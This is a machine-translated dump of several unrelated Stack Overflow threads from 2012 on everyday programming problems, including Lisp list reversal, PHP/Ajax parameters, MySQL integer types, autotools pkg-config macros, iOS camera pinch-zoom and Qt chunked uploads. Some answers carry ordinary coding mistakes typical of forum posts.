我必须反转一个简单（一维）列表的元素。我知道有一个内置的反向功能，但我不能为此使用它。

这是我的尝试：

```
(defun LISTREVERSE (LISTR)
    (cond
        ((< (length LISTR) 2) LISTR) ; listr is 1 atom or smaller
        (t (cons (LISTREVERSE (cdr LISTR)) (car LISTR))) ; move first to the end
    )
) 
```

输出非常接近，但是是错误的。

```
[88]> (LISTREVERSE '(0 1 2 3)) 
((((3) . 2) . 1) . 0) 
```

所以我尝试使用`append`而不是`cons`：

```
(t (append (LISTREVERSE (cdr LISTR)) (car LISTR))) 
```

但是得到了这个错误：

```
*** - APPEND: A proper list must not end with 2 
```

有什么帮助吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T03:09:15.280

我可以给你一些建议，因为这看起来像家庭作业：

*   递归的基本情况是当列表为空（null）时，而*不是*当列表中的元素少于两个时
*   考虑定义一个带有额外参数的辅助函数，一个在空列表中初始化的“累加器”。对于原始列表中的每个元素，`cons`它位于累加器的头部。当输入列表为空时，返回累加器

As an aside note, the above solution is tail-recursive.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T14:05:31.490

As a follow-up to Óscar López (and fighting the temptation to just write a different solution down):

*   Using both `append` and `length` makes the posted solution just about the least efficient way of reversing a list. Check out the documentation on [`cons`](http://www.lispworks.com/documentation/HyperSpec/Body/f_cons.htm) and [`null`](http://www.lispworks.com/documentation/HyperSpec/Body/f_null.htm) for some better ideas on how to implement this.
*   Please, *please* [indent properly](http://dept-info.labri.u-bordeaux.fr/~idurand/enseignement/PFS/Common/Strandh-Tutorial/indentation.html).
*   Tail recursion really is both more efficient and reasonably simple in this case. Try it if you haven't already. [`labels`](http://www.lispworks.com/documentation/HyperSpec/Body/s_flet_.htm#labels) is the form you want to use to define local recursive functions.
*   It may be worth your while to flip through [The Little Schemer](http://mitpress.mit.edu/catalog/item/default.asp?ttype=2&tid=4825). It'll give you a better feel for recursion in general.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T20:11:42.417

It's ok what you did. You only missed the composition of the result list.

Think about it: You have to append the 1-element list of the CAR to the end of the list of the reversed CDR:

```
(defun LISTREVERSE (LISTR)
    (cons
        ((< (length LISTR) 2) LISTR) ; listr is 1 atom or smaller
        (t (append (LISTREVERSE (cdr LISTR)) (list (car  LISTR)))))) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-17T19:33:05.580

```
(defun listreverse (list)
  (let (result)
    (dolist (item list result)
      (push item result)))) 
```

*   Don't use recursion in Common Lisp when there is a simple iterative way to reach the same goal. Common Lisp does not make any guarantees about tail recursion, and your tail recursive function invocation may not be optimized to a jump at the discretion of the compiler.
*   `push` prepends the item to the result
*   `dolist` has an optional third argument which is the value returned. It is evaluated when the loop is exited.

# php - 从 Ajax 获取变量到 Php

> ID：10220941
> 
> 赞同：0
> 
> 时间：2012-04-19T02:41:07.860
> 
> 标签：php, javascript, ajax

我有采用 textfiled 变量的 ajax 代码。它提醒值，但是当我想进入 php 时，它给了我一个**未定义索引的错误**

**JavaScript 代码**

```
<SCRIPT>
function go(UserID) {
var name= encodeURI(document.getElementById('name').value);
var design= encodeURI(document.getElementById('design').value);
http.open('get', 'testAjax.php?design='+design+'&name = '+name);
http.send(null);
}
</SCRIPT> 
```

**HTML 代码**

```
<INPUT ID='name' type='text'>
<INPUT ID='design' type='hidden' value="<?php echo $UserID; ?>">
<A href="?process" onclick="javascript:go(<?php echo $UserID; ?>)">Link</A> 
```

**php代码**

```
if(isset($_GET['process'])) {
echo $_GET['design'];
echo $_GET['name'];   
} 
```

请让我知道如何解决它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:57:08.143

您有一个锚标记，在该标记上您有一个 onclick 事件。触发时的 Onclick 事件将向`testAjax.php?`url 发送 ajax 请求。

但是，由于您没有阻止单击锚标记的默认行为，因此一旦发送此 ajax 请求，页面将重定向到`?process`，并且您当然不会收到任何`$_GET`参数。

假设您的 ajax 正常运行，请在函数`return false;`末尾添加。`go()`此外，由于在服务器端您有一个类似的子句`if(isset($_GET['process'])) {`，您还应该将您的 ajax url 更新为：`testAjax.php?process`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T03:00:50.250

好的，我发现了一些可能导致此问题的事情。尝试：

```
<script>
    function go(UserID) {
        var name= encodeURI(document.getElementById('name').value);
        var design= encodeURI(document.getElementById('design').value);
        http.open('get', 'testAjax.php?process&design='+design+'&name='+name);
        http.send(null);
    }
</script>

<input id='name' type='text' />
<input id='design' type='hidden' value="<?=$UserID; ?>" />
<a href="#" onclick="javascript:go(<?=$UserID; ?>)">Link</a> 
```

如您所见，我们删除了 html 变量“process”，并使其成为 ajax 调用的一部分。

# mysql - 如何使用 SQL 将列定义为 64 位整数

> ID：10220942
> 
> 赞同：14
> 
> 时间：2012-04-19T02:41:28.290
> 
> 标签：mysql, sql, integer

我正在创建一个表，如下所示：

```
create table SomeTable (
LoginTime int,
someValue 64bit-int
) 
```

如何将第二列定义为 64 位整数？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-19T08:47:17.867

在 MySQL 中，`BIGINT`数据类型表示一个 8 字节（64 位）整数。它可以是`SIGNED`或`UNSIGNED`允许（或阻止）列中的负数。

[您可以在此处](http://dev.mysql.com/doc/refman/5.5/en/integer-types.html)阅读有关 MySQL 整数数据类型的所有变体的更多信息。列属性在[这里](http://dev.mysql.com/doc/refman/5.5/en/numeric-type-attributes.html)讨论。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-19T02:45:26.123

我假设您使用的是 Sql Server。你想使用一个

```
bigint - signed 64-bit. 
```

# python - 出现黑屏，等待按键——怎么办？

> ID：10220943
> 
> 赞同：0
> 
> 时间：2012-04-19T02:41:32.657
> 
> 标签：python, windows

'瞧，

我目前正在尝试为我们计划运行的实验编写一个简单的例程。实验首先输入一个主题编号并创建一堆文件。我得到了那个部分的工作。接下来，我们希望屏幕变为空白并显示一条消息。诸如“*请填写问卷 1 并在完成后按 [ENTER]* ”之类的内容。

我的问题是，**您如何建议我显示一个空白屏幕，其中包含等待按下某个键的消息？**

我有相当多的编程经验，但之前没有使用过 Python，因此非常感谢任何提示。非常感谢您抽出宝贵时间！

~~~~~~~~~~~~~~~~~~

一些可能相关的额外信息：我们在 Windows XP (Service Pack 2) 计算机上运行它。整个问题是参与者基本上无法访问桌面或计算机上的任何东西。我们希望实验开始并在屏幕上显示一系列说明，受试者必须遵循这些说明，而他们不能中止等。希望这是有道理的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T02:48:08.460

如果您使用的是 python 2，请使用[raw_input()](http://docs.python.org/library/functions.html#raw_input)。

如果您使用的是 python 3，请使用[input()](http://docs.python.org/release/3.1.5/library/functions.html#input)。

您可以提示用户输入信息并将结果存储为字符串。

在 python 2.x 中

```
response = raw_input("What would you like to do next?") 
```

在 python 3.x 中

```
response = input("What would you like to do next?") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T03:01:17.610

在 Windows 上，您可以使用*msvcrt*模块中的函数。例如，[kbhit()](http://docs.python.org/library/msvcrt.html#msvcrt.kbhit)一直等到用户按下某个键。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T21:39:37.833

要在提示之前打印空白屏幕，我使用了以下内容

```
import os
import sys

VALIDINPUT = '0'
while VALIDINPUT == '0':
    p = os.popen('clear')
    for line1 in p.readlines():
    print line1
    <put the logic for reading user input here>
    <put the logic to check for valid user input here and if the user input is valid, then
    assign 1 to VALIDINPUT> 
```

这将显示一个空白屏幕和提示，直到用户提供有效输入。

希望这可以帮助。我在 Linux 上使用了这个。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T02:45:23.350

`raw_input('Please fill in questionnaire 1 and press [ENTER] when you are done.')`将等待有人点击 [enter]。

清除屏幕可能取决于操作系统/环境，我不确定。

# autotools - PKG_CHECK_MODULES 认为有害吗？

> ID：10220946
> 
> 赞同：29
> 
> 时间：2012-04-19T02:41:39.513
> 
> 标签：autotools, autoconf, pkg-config

各种开发人员不鼓励使用`PKG_CHECK_MODULES`（例如，在[这个答案](https://stackoverflow.com/a/10212870/287976)中），但就我所寻找的原因而言，没有明确、全面的解释。所以，我问：

*   为什么会`PKG_CHECK_MODULES`有害？
*   有哪些替代方案？

我，首先，今天第一次使用它。我发现它非常有用，特别是对于处理非常复杂的库集，例如 GTK+，我有所有这些依赖项：

```
-I/usr/lib/i386-linux-gnu/gtk-2.0/include -I/usr/include/atk-1.0
-I/usr/include/cairo -I/usr/include/gdk-pixbuf-2.0 -I/usr/include/pango-1.0 
-I/usr/include/gio-unix-2.0/ -I/usr/include/glib-2.0 
-I/usr/lib/i386-linux-gnu/glib-2.0/include -I/usr/include/pixman-1 
-I/usr/include/freetype2 -I/usr/include/libpng12

-lgdk-x11-2.0 -latk-1.0 -lgio-2.0 -lpangoft2-1.0 -lpangocairo-1.0 -lgdk_pixbuf-2.0 
-lcairo -lpango-1.0 -lfreetype -lfontconfig -lgobject-2.0 -lgmodule-2.0
-lgthread-2.0 -lrt -lglib-2.0 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-04-19T14:05:04.610

一个重要的问题`PKG_CHECK_MODULES`是它会导致不应该出现的故障。如果用户安装`libfoo`并使用`/p/a/t/h`调用`configure`脚本`LDFLAGS=-L/p/a/t/h`，则用户有理由期望找到该配置`libfoo`。但是，用户还必须进行设置`PKG_CONFIG_PATH`，以便`configure`脚本可以找到`foo.pc`以便配置成功，在我看来，这是损坏的。可以调用`AC_CHECK_LIB`，然后仅`PKG_CHECK_MODULES`在通过标准机制找不到库时才调用以避免该问题。另一个问题是完全有可能`PKG_CHECK_MODULES`找到`.pc`信息不准确的文件，从而导致构建失败。在这种情况下，有必要调用`AC_CHECK_LIB`after `PKG_CHECK_MODULES`。

总之，要`PKG_CHECK_MODULES`正确使用，需要先调用`AC_CHECK_LIBS`，再有条件地调用`PKG_CHECK_MODULES`，再调用`AC_CHECK_LIBS`验证找到的信息`PKG_CHECK_MODULES`。维护者所有这些额外的工作只是为了让用户更容易在非标准位置安装他们的库是荒谬的。用户应该设置他们的工具链来通过标准机制查找库。

- 编辑 -

澄清一下，我并不是建议使用鼓励使用的库的包`PKG_CHECK_MODULES`应避免在其配置中使用它。相反，我建议图书馆不要鼓励使用它并停止分发`.pc`文件。试图通过`.pc`文件解决的问题在更高的层次上得到更好的解决。autotools*不是*包管理系统，这是一个包管理工具应该解决的问题。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-05-29T09:46:11.613

这里有一篇博客文章详细介绍了 PKG_CHECK_MODULES 的坏方面：

[http://tirania.org/blog/archive/2012/Oct-20.html](http://tirania.org/blog/archive/2012/Oct-20.html)

或者这个stackoverflow问题：

[使用 pkg-config 宏 PKG_CHECK_MODULES 失败](https://stackoverflow.com/questions/8578181/using-the-pkg-config-macro-pkg-check-modules-failing)

它基本上归结为：如果有人试图运行 autoconf 并且没有安装 pkg-config，它会导致非常无用的错误。这是我今天运行的错误示例`autoconf && ./configure`：

```
./configure: line 5283: syntax error near unexpected token `FFMPEG,'
./configure: line 5283: `   PKG_CHECK_MODULES(FFMPEG, libavutil libavformat libavcodec libswscale, HAVE_FFMPEG=yes)' 
```

对于只是试图编译一个包的用户/开发人员来说，这不会尖叫“你需要安装 pkg-config”。

如果（如文章所示）您只是直接调用 pkg-config ，您会得到更多有用的错误，例如：

```
AC_SUBST(MONO_LIBS)
AC_SUBST(MONO_CFLAGS)
if pkg-config --atleast-version=2.10 mono; then
   MONO_CFLAGS=`pkg-config --cflags mono`
   MONO_LIBS=`pkg-config --libs mono`
else
   AC_MSG_ERROR(Get your mono from www.go-mono.com)
fi 
```

编辑：在评论中 Helmut Grohne 说：

> 请不要直接调用 pkg-config。这样做会破坏交叉编译。使用 AC_PATH_TOOL(PKG_CONFIG,pkg-config) 或更好的 PKG_PROG_PKG_CONFIG 来发现要使用哪个 $PKG_CONFIG。

我认为这是正确的，你应该听从他的建议，但我没有亲自尝试过。

其他人建议根本不使用 pkg-config ；这是一个单独的问题。

# mysql - mysql获取特定日期的状态

> ID：10220952
> 
> 赞同：0
> 
> 时间：2012-04-19T02:42:22.180
> 
> 标签：mysql

如何从表中获取日期最接近某个日期的行？如果在 2 月 27 日插入日志，状态会保持一段时间，不会添加其他记录。例如，我如何判断 3 月 8 日是哪个州？我有两张表：状态和历史

```
State:           History:

id|name       id|    date   |id_state
1 |works      1 |2010-08-06 |1
2 |broken     2 |2011-05-10 |1
3 |active     3 |2009-27-01 |2 
```

如果我绘制何时放入数据库的记录时间表......

```
2009-08-06                                  2010-08-06
---|--------------------------------------------|---------------->
'active'                                     'broken' 
```

所以它一直很活跃。当状态处于活动状态且日期为 2010 年 3 月 8 日时，我需要历史记录中的所有行。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T05:15:53.410

要获取给定日期之前的最后一个状态（这将为您提供给定日期的状态），请使用以下查询：

```
select * from (
    select *
    from log_table
    where `date` < $1
    and name = 'active'
    order by `date` desc) x
limit 1 
```

*您可以根据需要添加到 where 子句，以查找具有某些特定条件*的最新行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T05:16:10.843

简单查询。考虑到您提到的 2010 年 3 月 8 日的日期。

```
select h.id, h.date,h.id_state from history h
left outer join State s on s.id = h.id_state
where 
h.date = '2010-03-08' and s.id = 3 
```

您可以根据需要将 where 子句改写如下。

```
where h.date = '2010-03-08' and s.name = 'active' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T05:19:21.007

这可能有效

```
SELECT state.id, history.id, name, date 
FROM state
JOIN history ON state.id = history.id_state 
WHERE date = '2010-08-06' 
```

2张桌子的简单连接......

**编辑：** 要检索与给定日期最接近的日期，请使用此...

```
SELECT state.id, history.id, name, date
FROM state
JOIN history ON state.id = history.id_state
WHERE date <= '2012-04-10'
ORDER by date DESC
LIMIT 1 
```

你得到的正是一个，但最接近的日期......

**Edit2：** 要检索与给定日期最接近的日期，即是活动的...

```
SELECT state.id, history.id, name, date
FROM state
JOIN history ON state.id = history.id_state
WHERE date <= '2012-04-10' AND name = 'active'
ORDER by date DESC
LIMIT 1 
```

你得到的正是一个，但最接近的日期......

# dojo - 如何将动态字段添加到 Dojo 商店？

> ID：10220954
> 
> 赞同：0
> 
> 时间：2012-04-19T02:42:28.697
> 
> 标签：dojo

我有一个可观察的 dojo.store.JsonRest 存储，它包装在 dojo.data.ObjectStore 中，用于 dijit.form.Select 小部件。

每个商店商品都有一个名称字段和一个代码字段，我想将它们格式化并显示为标签。

通过为每个项目添加一个 get 函数，我可以添加代码来为虚拟标签字段返回一个格式化的字符串。

但是，如何将 get 功能添加到商店中的所有商品？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T04:04:51.933

我最终在 ObjectStore 上使用了 onFetch。

```
var setLabel = function(item) {
    item.label = item.name + ' (' + item.code + ')';
};
var store = new dojo.data.ObjectStore({
    objectStore: myObservableJsonRestStore,
    onFetch: function (results) {
        result.forEach(setLabel);
    }
}); 
```

如果有更整洁的替代品，我很想知道它们。

# iphone - AVCaptureDevice 相机变焦

> ID：10220958
> 
> 赞同：20
> 
> 时间：2012-04-19T02:42:54.613
> 
> 标签：iphone, objective-c, ios, avcapturesession, avcapture

我有一个简单的 AVCaptureSession 正在运行，以在我的应用程序中获取相机源并拍照。如何使用`UIGestureRecognizer`相机实现“捏缩放”功能？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2015-07-03T21:37:41.037

接受的答案实际上已经过时，我不确定它是否真的会拍摄放大图像的照片。有一种方法可以像 bcattle 回答说的那样放大。他的答案的问题是，它不负责用户可以放大然后从该缩放位置重新启动的事实。他的解决方案会产生一些不太优雅的跳跃。

最简单和最优雅的方法是使用捏合手势的速度。

```
-(void) handlePinchToZoomRecognizer:(UIPinchGestureRecognizer*)pinchRecognizer {
    const CGFloat pinchVelocityDividerFactor = 5.0f;

    if (pinchRecognizer.state == UIGestureRecognizerStateChanged) {
        NSError *error = nil;
        if ([videoDevice lockForConfiguration:&error]) {
            CGFloat desiredZoomFactor = device.videoZoomFactor + atan2f(pinchRecognizer.velocity, pinchVelocityDividerFactor);
            // Check if desiredZoomFactor fits required range from 1.0 to activeFormat.videoMaxZoomFactor
            device.videoZoomFactor = MAX(1.0, MIN(desiredZoomFactor, device.activeFormat.videoMaxZoomFactor));
            [videoDevice unlockForConfiguration];
        } else {
            NSLog(@"error: %@", error);
        }
    }
} 
```

我发现将 arctan 函数添加到速度会稍微减轻放大缩小效果。它并不完美，但效果足以满足需求。当它几乎达到 1 时，可能还有另一个功能可以缓解缩小。

**注意**：此外，捏合手势的比例从 0 到无限，其中 0 到 1 是捏合（缩小），1 到无限是捏合（放大）。要获得良好的放大缩小效果，您需要有一个数学方程式。速度实际上是从 -infinite 到无穷大，0 是起点。

**编辑**：修复了范围异常的崩溃。感谢[@garafajon](https://stackoverflow.com/users/698967/garafajon)！

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-04-07T21:39:01.957

从 iOS 7 开始，您可以直接[`videoZoomFactor`](https://developer.apple.com/library/prerelease/ios/documentation/AVFoundation/Reference/AVCaptureDevice_Class/index.html#//apple_ref/doc/uid/TP40009520-CH1-SW111)使用`AVCaptureDevice`.

将 的`scale`属性`UIPinchGestureRecognizer`与`videoZoomFactor`缩放常数联系起来。这将让您改变对味觉的敏感度：

```
-(void) handlePinchToZoomRecognizer:(UIPinchGestureRecognizer*)pinchRecognizer {
    const CGFloat pinchZoomScaleFactor = 2.0;

    if (pinchRecognizer.state == UIGestureRecognizerStateChanged) {
        NSError *error = nil;
        if ([videoDevice lockForConfiguration:&error]) {
            videoDevice.videoZoomFactor = 1.0 + pinchRecognizer.scale * pinchZoomScaleFactor;
            [videoDevice unlockForConfiguration];
        } else {
            NSLog(@"error: %@", error);
        }
    }
} 
```

请注意，与 ,`AVCaptureDevice`相关的所有其他内容都不`AVCaptureSession`是线程安全的。因此，您可能不想从主队列中执行此操作。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-19T03:04:26.257

许多人试图通过将图层上的变换属性设置为“`CGAffineTransformMakeScale(gesture.scale.x, gesture.scale.y);` 查看[此处](http://pbartend.googlecode.com/svn-history/r927/trunk/CamerTest/Classes/CamerTestViewController.m)”来实现此功能，以实现捏合缩放的完整实现。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2017-12-24T19:36:58.257

**Swift 4**
将捏合手势识别器添加到最前面的视图并将其连接到此操作（*pinchToZoom*）。*captureDevice*应该是当前为捕获会话提供输入的实例。*pinchToZoom为***前后**捕捉设备提供平滑缩放。

```
 @IBAction func pinchToZoom(_ pinch: UIPinchGestureRecognizer) {

    guard let device = captureDevice else { return }

    func minMaxZoom(_ factor: CGFloat) -> CGFloat { return min(max(factor, 1.0), device.activeFormat.videoMaxZoomFactor) }

    func update(scale factor: CGFloat) {
      do {
        try device.lockForConfiguration()
        defer { device.unlockForConfiguration() }
        device.videoZoomFactor = factor
      } catch {
        debugPrint(error)
      } 
    }

    let newScaleFactor = minMaxZoom(pinch.scale * zoomFactor)

    switch sender.state {
      case .began: fallthrough
      case .changed: update(scale: newScaleFactor)
      case .ended:
        zoomFactor = minMaxZoom(newScaleFactor)
        update(scale: zoomFactor)
     default: break
   }
 } 
```

在相机或 vc 上声明 zoomFactor 会很有用。我通常把它放在有 AVCaptureSession 的同一个单例上。这将作为 captureDevice 的*videoZoomFactor*的默认值。

```
var zoomFactor: Float = 1.0 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-03-25T10:44:38.853

我从@Gabriel Cartier 的解决方案开始（谢谢）。在我的代码中，我更喜欢使用更平滑的 rampToVideoZoomFactor 和更简单的方法来计算设备的比例因子。

```
(IBAction) pinchForZoom:(id) sender forEvent:(UIEvent*) event {
    UIPinchGestureRecognizer* pinchRecognizer = (UIPinchGestureRecognizer *)sender;

    static CGFloat zoomFactorBegin = .0;
    if ( UIGestureRecognizerStateBegan == pinchRecognizer.state ) {
        zoomFactorBegin = self.captureDevice.videoZoomFactor;

    } else if (UIGestureRecognizerStateChanged == pinchRecognizer.state) {
        NSError *error = nil;
        if ([self.captureDevice lockForConfiguration:&error]) {

            CGFloat desiredZoomFactor = zoomFactorBegin * pinchRecognizer.scale;
            CGFloat zoomFactor = MAX(1.0, MIN(desiredZoomFactor, self.captureDevice.activeFormat.videoMaxZoomFactor));
            [self.captureDevice rampToVideoZoomFactor:zoomFactor withRate:3.0];

            [self.captureDevice unlockForConfiguration];
        } else {
            NSLog(@"error: %@", error);
        }
    }
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-01-13T04:33:07.847

在 swift 版本中，您可以通过简单地在 videoZoomFactor 上传递缩放数字来放大/缩小。UIPinchGestureRecognizer 处理程序中的以下代码将解决该问题。

```
do {
    try device.lockForConfiguration()
    switch gesture.state {
    case .began:
        self.pivotPinchScale = device.videoZoomFactor
    case .changed:
        var factor = self.pivotPinchScale * gesture.scale
        factor = max(1, min(factor, device.activeFormat.videoMaxZoomFactor))
        device.videoZoomFactor = factor
    default:
        break
    }
    device.unlockForConfiguration()
} catch {
    // handle exception
} 
```

在这里，pivotPinchScale 是一个 CGFloat 属性，它在你的控制器中某处声明。

您还可以参考以下项目来了解相机如何与 UIPinchGestureRecognizer 配合使用。 [https://github.com/DragonCherry/CameraPreviewController](https://github.com/DragonCherry/CameraPreviewController)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-11-05T04:51:46.673

有一种更简单的方法可以使用捏合识别器处理相机缩放级别。您唯一需要做的就是将其设置为像这样`cameraDevice.videoZoomFactor`的状态识别器`.began`

```
@objc private func viewPinched(recognizer: UIPinchGestureRecognizer) {
    switch recognizer.state {
        case .began:
            recognizer.scale = cameraDevice.videoZoomFactor
        case .changed:
            let scale = recognizer.scale
            do {
                 try cameraDevice.lockForConfiguration()
                 cameraDevice.videoZoomFactor = max(cameraDevice.minAvailableVideoZoomFactor, min(scale, cameraDevice.maxAvailableVideoZoomFactor))
                 cameraDevice.unlockForConfiguration()
            }
            catch {
                print(error)
            }
        default:
            break
    }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-04-16T07:15:30.397

基于@Gabriel Cartier 的回答：

```
- (void) cameraZoomWithPinchVelocity: (CGFloat)velocity {
    CGFloat pinchVelocityDividerFactor = 40.0f;
    if (velocity < 0) {
        pinchVelocityDividerFactor = 5.; //zoom in
    }

    if (_videoInput) {
        if([[_videoInput device] position] == AVCaptureDevicePositionBack) {
            NSError *error = nil;
            if ([[_videoInput device] lockForConfiguration:&error]) {
                CGFloat desiredZoomFactor = [_videoInput device].videoZoomFactor + atan2f(velocity, pinchVelocityDividerFactor);
                // Check if desiredZoomFactor fits required range from 1.0 to activeFormat.videoMaxZoomFactor
                CGFloat maxFactor = MIN(10, [_videoInput device].activeFormat.videoMaxZoomFactor);
                [_videoInput device].videoZoomFactor = MAX(1.0, MIN(desiredZoomFactor, maxFactor));
                [[_videoInput device] unlockForConfiguration];
            } else {
                NSLog(@"cameraZoomWithPinchVelocity error: %@", error);
            }
        }
    }
} 
```

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2015-07-14T06:22:57.940

我正在使用 iOS SDK 8.3 和 AVfoundation 框架，对我来说，使用以下方法适用于：

```
nameOfAVCaptureVideoPreviewLayer.affineTransform = CGAffineTransformMakeScale(scaleX, scaleY) 
```

为了以相同的比例保存图片，我使用了以下方法：

```
nameOfAVCaptureConnection.videoScaleAndCropFactor = factorNumber; 
```

下面的代码用于获取比例中的图像

```
[stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnnection completionHandler:^(CMSampleBufferRef imageDataSampleBuffer, NSError *error) {
        if(imageDataSampleBuffer != NULL){

            NSData *imageData = [AVCaptureStillImageOutput  jpegStillImageNSDataRepresentation:imageDataSampleBuffer];
            UIImage *image = [UIImage imageWithData:imageData];
}
}]; 
```

# asp.net-mvc-3 - MVC3 WebGrid 行选择复选框

> ID：10220959
> 
> 赞同：0
> 
> 时间：2012-04-19T02:43:26.330
> 
> 标签：asp.net-mvc-3, webgrid

我到处搜索，似乎找不到答案。

我有一个带有 WebGrid 的 MVC3 项目。第一列是当前使用普通项目的 Select。GetSelectLink 用于创建链接以选择该行。

我希望这是一个复选框，而不是测试“选择”。当用户点击复选框时，我希望选择网格中的该行并将该框变为“选中”。

我希望选中和未选中状态是我提供的图像。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T18:14:34.100

除非您使用 Ajax 做一些花哨的事情，否则“选择”链接会刷新页面，并将“Selected=index”添加到查询字符串中。这将是一种不寻常的体验，因为人们不习惯复选框触发页面重新加载。

你可以做这样的事情，它完全模仿“选择”链接功能。首先将复选框添加到该行：

```
grid.Column(
    format: (item) => @Html.Raw("<input class='select' type='checkbox'" +  ((grid.SelectedRow == item) ? "checked" : "") + " />")
) 
```

然后添加一些 Javascript 来处理复选框点击：

```
var index = 1;
$("input.select").each(function () {
    $(this).data('row', index);
    $(this).click(function () { window.location = "?Selected=" + $(this).data('row'); });
    index++;
}); 
```

# grails - 如何在 grails 中模拟数据源以进行单元测试

> ID：10220962
> 
> 赞同：2
> 
> 时间：2012-04-19T02:43:42.930
> 
> 标签：grails, grails-domain-class

我在我的域类查找器方法中使用 sql，并将数据源作为参数传递给 sql 构造函数。Sql sql = 新 Sql(dataSource)

如何在单元测试中模拟数据源？

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T03:42:51.333

如果您需要与数据库交互，那么您的测试应该是集成测试而不是单元测试。

[http://grails.org/doc/latest/guide/testing.html](http://grails.org/doc/latest/guide/testing.html)有一些信息，或者是“单元与集成测试”的通用 google

如果您没有使用`sql`您正在创建的对象，而只是试图满足它的构造函数，那么将映射别名传递为正确的类（具有适当的字段和方法）可能会起作用。一个小例子：[http ://www.groovyexamples.org/2010/05/25/create-a-mock-object-for-an-abstract-class-using-a-map/](http://www.groovyexamples.org/2010/05/25/create-a-mock-object-for-an-abstract-class-using-a-map/) **更新：断开的链接。站点不再存在。**

# amazon-web-services - 无法在 AWS 中创建 CNAME 记录

> ID：10220963
> 
> 赞同：2
> 
> 时间：2012-04-19T02:43:54.033
> 
> 标签：amazon-web-services, dns, cname

我有一个域 (mydomain.com)。我使用 AWS Route 53 将此域指向 EC2 上托管的服务器。我能够为“www.mydomain.com”或“someprefix.mydomain.com”添加 CNAME 记录。Route 53 具有“mydomain.com”的 SOA 和 NS 记录，并且不允许为“mydomain.com”添加 CNAME 记录。

我需要此记录才能在浏览器中键入带或不带前导“www”的域。

更重要的是，我计划在机器上运行一个邮件服务器，并且我相信邮件客户端需要解析我的用户电子邮件地址的“mydomain.com”部分（例如 user@mydomain.com）。

我怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T09:51:30.817

To make it all hang together... Set up

*   A mydomain.com # Sets up your main domain
*   CNAME www.mydomain.com # Sets up your www domain. (you may want to redirect one to the other to avoid duplicate content
*   NS ns.whatever.com
    ns2.whatever.com
*   MX mail.mydomain.com

This is assuming your not using ELB

A CNAME cannot point to the root domain. Same DNS services will allow it, but a CNAME should point to a service on the domain. ie - the www service in the above case.

# c++ - 使用信号和插槽增量上传文件

> ID：10220967
> 
> 赞同：0
> 
> 时间：2012-04-19T02:44:43.343
> 
> 标签：c++, qt, azure-storage, signals-slots, qnetworkaccessmanager

在实施此之前，我想检查这是否会导致未定义的行为或竞争条件。

确保上传文件时，必须分块完成。我想并行上传 5 个块，它们都从同一个文件中获取数据。这会像这样发生：

```
char *currentDataChunk;
int currentDataChunkSize;

connect(_blobStorageProvider, SIGNAL(putBlockSucceded(int)), this, SLOT(finalizeAndUploadNextBlock(int)));

int parallelUploads = ((_item->size() / MAX_BLOCK_SIZE) >= MAX_PARALLEL_BLOCKUPLOADS) ? MAX_PARALLEL_BLOCKUPLOADS : (_item->size() / MAX_BLOCK_SIZE);

_latestProcessedBlockId = (parallelUploads - 1);

for(int i = 0; i < parallelUploads; i++) {

    currentDataChunkSize = _item->read(currentDataChunk, MAX_BLOCK_SIZE);

    ...

    uploader->putBlock(_container, _blobName, currentDataChunk, i);
} 
```

在上传器的 putBlock 函数中，它通过调用调用 QNetworkAccessManager。完成后，如果失败、成功或被取消，它会发回一个信号以及 blockId，以便我知道上传了哪个块。

```
void BigBlobUploader::finalizeAndUploadNextBlock(int blockId) {

    // FINALIZE BY ADDING SUCCESSFUL BLOCK TO FUTURE BLOCKLIST
    QByteArray temp;

    for(int i = 0; i != sizeof(blockId); i++) {
        temp.append((char)(blockId >> (i * 8)));
    }

    _uploadedBlockIds.insert(blockId, QString(temp.toBase64()));
    this->uploadNextBlock();
} 

void BigBlobUploader::uploadNextBlock() {

    char *newDataChunk;
    int newDataChunkSize = _item->read(newDataChunk, MAX_BLOCK_SIZE);
    ...
    _latestProcessedBlockId++;
    uploader->putBlock(_container, _blobName, newDataChunk, _latestProcessedBlockId);
} 
```

我现在的计划是将这些信号提取到一个插槽，该插槽应该注意这个块已上传（将它放在一个列表中以便能够放置一个块列表来完成这个 blob），将索引增加一（从 5 开始) 并获取新的数据块并重做整个过程。

我现在的问题是，如果其中两个同时完成怎么办？我不是在这里处理线程，但是由于默认情况下 HTTP 请求是线程化的，所以这里是什么情况？信号是否排队（或者我应该使用 QueuedConnection）？可以并行调用一个槽吗？有没有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T12:59:17.473

